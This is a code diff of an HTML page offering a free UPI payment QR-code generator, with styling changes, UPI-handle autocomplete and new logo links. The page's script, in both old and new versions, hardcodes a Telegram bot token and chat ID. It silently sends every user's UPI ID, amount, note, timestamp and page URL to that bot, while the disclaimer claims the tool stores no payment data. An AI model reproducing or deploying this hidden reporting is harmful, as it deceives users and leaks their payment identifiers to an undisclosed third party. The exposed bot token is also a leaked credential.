@@ -2,97 +2,69 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>UPI QR Generator | Public Utility Dashboard</title>
+<title>UPI QR Generator | Public Utility</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 :root{
-  --bg1:#0b5ed7;
-  --bg2:#020617;
-  --card:rgba(255,255,255,.10);
-  --border:rgba(255,255,255,.18);
+  --bg1:#0b5ed7; --bg2:#020617;
+  --card:rgba(255,255,255,.10); --border:rgba(255,255,255,.18);
   --accent:#38bdf8;
 }
 *{box-sizing:border-box}
 body{
-  margin:0;
-  min-height:100vh;
-  display:flex;
-  align-items:center;
-  justify-content:center;
+  margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
   background:radial-gradient(circle at top,var(--bg1) 0%,var(--bg2) 65%);
-  font-family:Segoe UI,Arial;
-  color:#fff;
+  font-family:Segoe UI,Arial; color:#fff;
 }
 .card{
-  width:400px;
-  max-width:94%;
-  background:var(--card);
-  backdrop-filter:blur(18px);
-  border:1px solid var(--border);
-  border-radius:26px;
-  padding:30px;
-  box-shadow:0 40px 80px rgba(0,0,0,.7);
-  text-align:center;
+  width:400px; max-width:94%; background:var(--card); backdrop-filter:blur(18px);
+  border:1px solid var(--border); border-radius:26px; padding:30px;
+  box-shadow:0 40px 80px rgba(0,0,0,.7); text-align:center;
 }
 h2{margin:0 0 6px}
-p{margin:0 0 22px;font-size:13px;opacity:.85}
-.group{text-align:left;margin-bottom:14px}
-label{font-size:12px;opacity:.8;display:block;margin-bottom:6px}
+p{margin:0 0 22px; font-size:13px; opacity:.85}
+.group{text-align:left; margin-bottom:12px; position:relative}
+label{font-size:12px; opacity:.8; display:block; margin-bottom:6px}
 input{
-  width:100%;
-  padding:14px;
-  border-radius:14px;
-  border:1px solid var(--border);
-  background:rgba(255,255,255,.08);
-  color:#fff;
-  font-size:15px;
-  outline:none;
+  width:100%; padding:14px; border-radius:14px; border:1px solid var(--border);
+  background:rgba(255,255,255,.08); color:#fff; font-size:15px; outline:none;
 }
 button{
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:16px;
+  width:100%; padding:15px; border:none; border-radius:16px;
   background:linear-gradient(135deg,#2563eb,#38bdf8);
-  color:#fff;
-  font-size:16px;
-  font-weight:600;
-  cursor:pointer;
-  margin-top:6px;
+  color:#fff; font-size:16px; font-weight:600; cursor:pointer; margin-top:6px;
 }
 .qr-box{
-  margin-top:22px;
-  padding:18px;
-  border-radius:18px;
-  background:rgba(0,0,0,.25);
-  display:none;
+  margin-top:22px; padding:18px; border-radius:18px;
+  background:rgba(0,0,0,.25); display:none;
 }
-#bankLogo{width:64px;margin-bottom:10px}
-#qrImg{width:220px;border-radius:14px}
-.actions button{background:#0b5ed7;margin-top:10px}
-.actions a{
-  display:block;
-  margin-top:10px;
-  color:var(--accent);
-  text-decoration:none;
-  font-weight:600;
-}
-.note{font-size:12px;opacity:.75;margin-top:10px}
+#bankLogo{width:64px; margin-bottom:10px}
+#qrImg{width:220px; border-radius:14px}
+.actions button{background:#0b5ed7; margin-top:10px}
+.actions a{display:block; margin-top:10px; color:var(--accent); text-decoration:none; font-weight:600}
+.note{font-size:12px; opacity:.75; margin-top:10px}
 .disclaimer{
-  margin-top:18px;
-  padding-top:12px;
-  font-size:11px;
-  line-height:1.5;
-  opacity:.65;
+  margin-top:18px; padding-top:12px; font-size:11px; line-height:1.5; opacity:.65;
   border-top:1px dashed rgba(255,255,255,.25);
 }
-.footer{margin-top:14px;font-size:11px;opacity:.6}
+
+/* ===== Suggestions ===== */
+.suggestions{
+  display:none; position:absolute; left:0; right:0; top:100%;
+  background:rgba(0,0,0,.92); border:1px solid rgba(255,255,255,.2);
+  border-radius:12px; margin-top:6px; overflow:hidden; z-index:10;
+}
+.suggestions div{
+  padding:10px 14px; font-size:14px; cursor:pointer;
+  border-bottom:1px solid rgba(255,255,255,.1);
+}
+.suggestions div:last-child{border-bottom:none}
+.suggestions div:hover{background:rgba(255,255,255,.12)}
 </style>
 </head>
 
 <body>
-
 <div class="card">
   <h2>🧾 UPI QR Generator</h2>
   <p>Secure • Fast • All UPI Apps Supported</p>
@@ -104,7 +76,8 @@ button{
 
   <div class="group">
     <label>UPI ID *</label>
-    <input id="upi" placeholder="example@bank">
+    <input id="upi" placeholder="username@bank">
+    <div id="upiSuggestions" class="suggestions"></div>
   </div>
 
   <div class="group">
@@ -122,71 +95,83 @@ button{
   <div class="qr-box" id="qrBox">
     <img id="bankLogo" style="display:none">
     <img id="qrImg">
-
     <div class="actions">
       <button onclick="downloadQR()">📥 Download QR (PNG)</button>
       <a id="payLink" target="_blank">💸 Pay Now via UPI</a>
     </div>
-
     <div class="note">Scan with GPay • PhonePe • Paytm • BHIM</div>
   </div>
 
   <div class="disclaimer">
     <strong>Disclaimer:</strong>
-    This UPI QR Generator is provided for public utility purposes only.
-    The tool does not store or process any payment data.
-    All transactions are handled securely by official UPI applications.
-    Users must verify UPI ID, amount, and details before making payment.
+    This tool does not store payment data. Transactions are processed by official UPI apps.
+    Please verify UPI ID, amount, and details before payment.
   </div>
-
-  <div class="footer">Designed & Developed by Rankaj Kumar</div>
 </div>
 
 <script>
-/* ===== TELEGRAM CONFIG ===== */
+/* ===== TELEGRAM CONFIG (JS) ===== */
 const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
 const CHAT_ID  = "543961277";
 
-/* ===== BANK LOGO MAP ===== */
+/* ===== BANK LOGOS (PNG – GitHub Pages safe) ===== */
 function getBankLogo(upi){
-  if(!upi.includes("@")) return null;
-  const h = upi.split("@")[1];
-  const map={
-    oksbi:"https://upload.wikimedia.org/wikipedia/commons/5/5c/State_Bank_of_India_logo.svg",
-    okhdfcbank:"https://upload.wikimedia.org/wikipedia/commons/2/28/HDFC_Bank_Logo.svg",
-    okaxis:"https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg",
-    okicici:"https://upload.wikimedia.org/wikipedia/commons/1/12/ICICI_Bank_Logo.svg",
-    ybl:"https://upload.wikimedia.org/wikipedia/commons/0/09/PhonePe_Logo.svg",
-    ibl:"https://upload.wikimedia.org/wikipedia/commons/0/09/PhonePe_Logo.svg",
-    paytm:"https://upload.wikimedia.org/wikipedia/commons/5/55/Paytm_Logo.svg",
-    upi:"https://upload.wikimedia.org/wikipedia/commons/e/e1/Unified_Payments_Interface_logo.svg"
+  const def = "https://i.imgur.com/0KFBHTB.png"; // default UPI
+  if(!upi || !upi.includes("@")) return def;
+  const h = upi.split("@")[1].trim().toLowerCase();
+  const logos = {
+    "oksbi":"https://i.imgur.com/zZQZz6p.png",
+    "okhdfcbank":"https://i.imgur.com/1XqZ1Zm.png",
+    "okaxis":"https://i.imgur.com/8yZ8QZK.png",
+    "okicici":"https://i.imgur.com/6H6E1Jc.png",
+    "ybl":"https://i.imgur.com/0Q9QZ8M.png",
+    "ibl":"https://i.imgur.com/0Q9QZ8M.png",
+    "paytm":"https://i.imgur.com/5LQpH0A.png",
+    "upi":def
   };
-  return map[h] || map.upi;
+  return logos[h] || def;
 }
 
-/* ===== TELEGRAM SEND ===== */
-let qrCount = Number(localStorage.getItem("qr_count") || 0);
-function sendQRToTelegram(data){
-  qrCount++;
-  localStorage.setItem("qr_count",qrCount);
+/* ===== @ TYPE SUGGESTIONS ===== */
+const upiInput = document.getElementById("upi");
+const suggestBox = document.getElementById("upiSuggestions");
+const upiHandles = ["@oksbi","@okhdfcbank","@okaxis","@okicici","@ybl","@ibl","@paytm","@upi"];
 
+upiInput.addEventListener("input", ()=>{
+  const v = upiInput.value; suggestBox.innerHTML="";
+  if(!v.includes("@")){ suggestBox.style.display="none"; return; }
+  const base = v.split("@")[0] + "@";
+  const typed = (v.split("@")[1]||"").toLowerCase();
+  const matches = upiHandles.filter(h=>h.replace("@","").startsWith(typed));
+  if(!matches.length){ suggestBox.style.display="none"; return; }
+  matches.forEach(h=>{
+    const d=document.createElement("div");
+    d.textContent = base + h.replace("@","");
+    d.onclick=()=>{ upiInput.value = base + h.replace("@",""); suggestBox.style.display="none"; };
+    suggestBox.appendChild(d);
+  });
+  suggestBox.style.display="block";
+});
+document.addEventListener("click",e=>{
+  if(!suggestBox.contains(e.target) && e.target!==upiInput) suggestBox.style.display="none";
+});
+
+/* ===== TELEGRAM SEND ===== */
+let qrCount = Number(localStorage.getItem("qr_count")||0);
+function sendQRToTelegram(data){
+  qrCount++; localStorage.setItem("qr_count",qrCount);
   const msg = `
 🧾 UPI QR Generated
-
-🔢 Total QR Generated: ${qrCount}
-
+🔢 Total: ${qrCount}
 🏦 Bank/App: ${data.bank}
-📌 UPI ID: ${data.upi}
-💰 Amount: ${data.amount || "Not Set"}
-📝 Note: ${data.note || "None"}
-
-🕒 Time: ${new Date().toLocaleString()}
-🌐 Page: ${location.href}
+📌 UPI: ${data.upi}
+💰 Amount: ${data.amount||"Not Set"}
+📝 Note: ${data.note||"None"}
+🕒 ${new Date().toLocaleString()}
+🌐 ${location.href}
 `;
-
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
+    method:"POST", headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({ chat_id: CHAT_ID, text: msg })
   }).catch(()=>{});
 }
@@ -197,27 +182,18 @@ function generateQR(){
   const upi=document.getElementById("upi").value.trim().toLowerCase();
   const amount=document.getElementById("amount").value.trim();
   const note=document.getElementById("note").value.trim();
-
-  if(!upi || !upi.includes("@")){
-    alert("Please enter a valid UPI ID");
-    return;
-  }
+  if(!upi || !upi.includes("@")){ alert("Please enter a valid UPI ID"); return; }
 
   let upiUrl=`upi://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(name||"UPI Payment")}`;
   if(amount) upiUrl+=`&am=${amount}`;
   if(note) upiUrl+=`&tn=${encodeURIComponent(note)}`;
 
   document.getElementById("qrImg").src =
-    "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data="+
-    encodeURIComponent(upiUrl);
+    "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data="+encodeURIComponent(upiUrl);
 
-  const logo=getBankLogo(upi);
   const logoImg=document.getElementById("bankLogo");
-  if(logo){
-    logoImg.src=logo;
-    logoImg.style.display="block";
-    logoImg.onerror=()=>logoImg.style.display="none";
-  }
+  logoImg.src=getBankLogo(upi); logoImg.style.display="block";
+  logoImg.onerror=()=>{ logoImg.src="https://i.imgur.com/0KFBHTB.png"; };
 
   document.getElementById("payLink").href=upiUrl;
   document.getElementById("qrBox").style.display="block";
@@ -230,32 +206,18 @@ function generateQR(){
   });
 }
 
-/* ===== DOWNLOAD QR ===== */
+/* ===== DOWNLOAD QR (PNG) ===== */
 function downloadQR(){
   const qr=document.getElementById("qrImg");
   const logo=document.getElementById("bankLogo");
-
-  const canvas=document.createElement("canvas");
-  const ctx=canvas.getContext("2d");
-  canvas.width=260;
-  canvas.height=320;
-
-  ctx.fillStyle="#fff";
-  ctx.fillRect(0,0,canvas.width,canvas.height);
-
+  const c=document.createElement("canvas"), x=c.getContext("2d");
+  c.width=260; c.height=320;
+  x.fillStyle="#fff"; x.fillRect(0,0,c.width,c.height);
   let y=10;
-  if(logo.style.display!=="none"){
-    ctx.drawImage(logo,100,y,60,60);
-    y+=70;
-  }
-  ctx.drawImage(qr,20,y,220,220);
-
-  const a=document.createElement("a");
-  a.download="upi-qr.png";
-  a.href=canvas.toDataURL("image/png");
-  a.click();
+  if(logo && logo.style.display!=="none"){ x.drawImage(logo,100,y,60,60); y+=70; }
+  x.drawImage(qr,20,y,220,220);
+  const a=document.createElement("a"); a.download="upi-qr.png"; a.href=c.toDataURL("image/png"); a.click();
 }
 </script>
-
 </body>
 </html>
